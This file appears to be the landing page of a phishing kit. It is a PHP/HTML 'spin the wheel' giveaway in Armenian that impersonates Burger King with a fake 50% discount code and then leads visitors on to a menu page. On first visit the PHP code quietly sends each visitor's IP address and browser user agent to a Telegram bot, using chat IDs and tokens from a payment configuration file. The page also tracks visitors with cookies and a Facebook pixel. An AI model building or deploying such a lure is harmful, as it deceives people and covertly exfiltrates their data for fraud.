<?php

include('./payment/config.php');
$ip = getUserIP();
$ua = $_SERVER['HTTP_USER_AGENT'];

if ( !isset($_COOKIE['session']) ) {

	$permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
	$session         = substr(str_shuffle($permitted_chars), 5, 5);
    
    $chat = 0;
    setcookie('chat', $chat, strtotime('+30 days'));
    
    sendTelegram(
		'sendMessage',
		array(
			'chat_id' => CHATS[$chat]['sessions'],
			'text' => "&#128100; <b>SESSION: </b>#".$session." \n".
					  "<b>IP: </b><code>".$ip."</code>\n".
					  "<b>UA: </b><code>".$ua."</code>",
			'parse_mode' =>  'html',
			'disable_notification' => true
		),
		CHATS[$chat]['token']
	);

    setcookie('session', $session, strtotime('+30 days'));
} else {
    $session = $_COOKIE['session'];
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Weekend Giveaway – Win an Exclusive Discount!</title>
  <meta name="description" content="🍔 Spin the wheel of luck and be guaranteed to win a discount or a tasty prize 🛵">
  <link rel="shortcut icon" href="img/logo.svg" type="image/x-icon">
  <link rel="stylesheet" href="css/reset.css">
  <link rel="stylesheet" href="css/style.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Knewave&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap"
    rel="stylesheet">
   <script>
        var gets=function(){var o=window.location.search,l=new Object;o=o.substring(1).split("&");for(var t=0;t<o.length;t++)c=o[t].split("="),l[c[0]]=c[1];return l}();let local=sessionStorage;var pix=window.location.search;local.setItem("pix",pix);
    </script>
</head>

<body>
  <div class="wrapper">
    <header class="header">
      <img class="header__bg desk" src="img/Header.png" alt="">
      
      <img class="header__logo" src="bkimg/Group-85-Copy.svg" alt="">
    </header>
    <main>
      <div class="main__title">
      Խաղացեք հիմա և շահեք բացառիկ մրցանակ!
      </div>
      <div class="main__subt">
      Թեքեք բախտի անիվը և երաշխավորված եղեք, որ կշահեք զեղչ կամ համեղ մրցանակ:
      </div>
      <div class="main__wheel">
        <img class="wheel__obvod" src="img/wheel-bg.png" alt="">
        <img class="wheel" src="img/wheel-cent.png" alt="">
        <img class="wheel__arrow" src="img/arrow.svg" alt="">
        <img class="wheel__larrow" src="img/l-arr.svg" alt="">
        <img class="wheel__rarrow" src="img/r-arr.svg" alt="">
        <div class="wheel__shadow"></div>

      </div>
      <div class="main__btn">
        <button onclick="goWheel()" class="main__button">
        Փորձեք ձեր բախտը
        </button>
      </div>
    </main>
    <div class="popup-cont">
      <div class="popup">
        <img class="pop__gift" src="img/gift.svg" alt="">
        <img class="pop__plastO" src="img/plast.svg" alt="">
        <img class="pop__plastF" src="img/plast.svg" alt="">
        <div class="popup-t">
        Շնորհավորում եմ:
        </div>
        <div class="popup-descr">
        Դուք շահել եք գովազդային կոդ 50% զեղչի համար <br>
          <span class="red-txt">BURGERKING25</span><span class="red-txt"></span>
        </div>
        <button class="popup-btn" onclick="window.location.href = 'menu.php'">
        Պատվիրե՛ք հիմա
        </button>
      </div>
    </div>
  </div>
    <script>
        !function(e,t,n,i,c,o,a){e.fbq||(c=e.fbq=function(){c.callMethod?c.callMethod.apply(c,arguments):c.queue.push(arguments)},e._fbq||(e._fbq=c),c.push=c,c.loaded=!0,c.version="2.0",c.queue=[],(o=t.createElement(n)).async=!0,o.src="https://connect.facebook.net/en_US/fbevents.js",(a=t.getElementsByTagName(n)[0]).parentNode.insertBefore(o,a))}(window,document,"script");var pixel=gets.fbpixel;fbq("init",pixel),fbq("track","PageView"),document.createElement("div").innerHTML=`<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=${pixel}&ev=PageView&noscript=1">`;
    </script>
    
  <script src="js/main.js"></script>
</body>

</html>
